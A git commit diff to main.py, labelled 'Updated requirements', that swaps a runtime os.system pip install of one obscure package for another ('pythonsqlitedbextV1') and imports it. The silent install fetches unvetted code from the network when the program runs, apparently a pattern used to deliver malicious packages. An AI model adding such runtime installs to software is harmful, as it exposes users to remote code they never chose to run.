3dbc16964aa91e8cb858231217764b4f8ce28edc
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-14 17:01:41 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbmodules")
-import pythonsqlitedbmodules
+os.system("pip install pythonsqlitedbextV1")
+import pythonsqlitedbextV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
